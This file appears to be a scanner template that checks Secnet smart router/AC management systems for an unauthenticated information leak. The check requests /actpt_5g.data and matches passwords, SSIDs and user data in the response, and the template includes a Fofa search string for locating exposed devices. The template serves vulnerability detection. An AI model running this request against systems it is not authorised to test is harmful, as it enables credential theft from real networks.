# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ap_info
          - passwd
          - ssids
          - user_info
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/actpt_5g.data'
id: secnet-router-actpt-5g-data-disclosure
info:
  author: zan8in
  description: |-
    secnet安网智能AC管理系统是广州安网通信技术有限公司（简称“安网通信”）的无线AP管理系统。secnet安网智能AC管理系统存在信息漏洞，攻击者可利用该漏洞获取敏感信息。
    Fofa: title="安网-智能路由系统" || header="HTTPD_ac 1.0"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Secnet 智能路由系统 actpt_5g.data 信息泄露
  severity: high
  tags: secnet,actpt_5g,argus-import
